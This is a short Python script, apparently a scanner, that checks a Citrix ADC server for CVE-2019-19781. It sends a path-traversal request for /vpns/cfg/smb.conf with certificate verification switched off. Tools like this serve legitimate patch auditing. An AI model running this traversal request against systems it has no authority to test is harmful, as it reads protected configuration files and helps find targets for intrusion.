import requests,warnings,sys,os,random
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
from requests.exceptions import ConnectionError

colour=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m']
color=('\033[0;92m')
colo=('\033[0;96m')
normal=('\033[1;m')

try:
	def top():
		print('#'*71)

	def topspace():
		for x in range(2):
			print('#'+' '*69+'#')

	def msg():
		print('#'+' '*22+random.choice(colour)+'Citrix ADC Server Checker'+normal+' '*21+' #')
		print('#'+' '*25+random.choice(colour)+'IG: @inveteck_global'+normal+' '*24+'#')
		print('#'+' '*26+random.choice(colour)+'By TeamInveteck '+normal+' '*27+'#')

	#banner
	def banner():
		top()
		topspace()
		msg()
		topspace()
		top()



	def trigger(ip,port):
		getIt = requests.get("https://"+ip+":"+str(port)+"/vpn/../vpns/cfg/smb.conf", verify=False)
		if ("global") in getIt.content:
			print(random.choice(colour)+"[+] Target: "+ip+" is vulnerable to CVE-2019-19781\n"+normal)
		elif ("Citrix") in getIt.content:
			print(random.choice(colour)+"[+] Target: "+ip+" is not vulnerable\n"+normal)
		else:
			print(random.choice(colour)+"[+] Target: "+ip+" is not a Citrix ADC Server\n"+normal)

	banner()
	ip=raw_input("Enter ip address:")
	port=input("Enter port address:")
	trigger(ip,port)

except KeyboardInterrupt:
	os.system('clear')
	sys.exit()
